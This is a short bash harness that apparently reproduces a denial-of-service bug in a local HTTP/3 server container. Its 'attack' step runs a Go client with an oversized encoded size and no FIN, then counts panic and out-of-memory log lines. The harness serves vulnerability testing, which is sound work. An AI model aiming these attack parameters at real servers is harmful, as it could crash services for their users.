#!/usr/bin/env bash
set -u

DIR="$(cd "$(dirname "$0")" && pwd)"
COMPOSE=(docker compose -f "$DIR/docker-compose.yml")
PORT="${PORT:-8088}"
CONTAINER="${CONTAINER:-ha-h3}"

state() {
    if docker ps --format '{{.Names}}' | grep -qx "$CONTAINER"; then
        echo "server: ALIVE"
    else
        echo "server: DOWN oom=$(docker inspect "$CONTAINER" --format '{{.State.OOMKilled}}' 2>/dev/null) exit=$(docker inspect "$CONTAINER" --format '{{.State.ExitCode}}' 2>/dev/null)"
    fi
}

case "${1:-}" in
    start)  "${COMPOSE[@]}" up -d --build; sleep 5; state ;;
    attack) (cd "$DIR/client" && go run . -target "127.0.0.1:${PORT}" -conns 1 -streams 1 -max-encoded-size 1000000 -no-fin -hold 5s)
            sleep 2
            echo "panic_count=$(docker logs "$CONTAINER" 2>&1 | grep -c 'size overflows MAX_SIZE')"
            docker logs --tail 4 "$CONTAINER" 2>&1 ;;
    status) state; docker logs --tail 5 "$CONTAINER" 2>&1 ;;
    logs)   docker logs -f "$CONTAINER" ;;
    stop)   "${COMPOSE[@]}" down --remove-orphans ;;
    *)      echo "usage: ./run.sh {start|attack|status|logs|stop}" ;;
esac
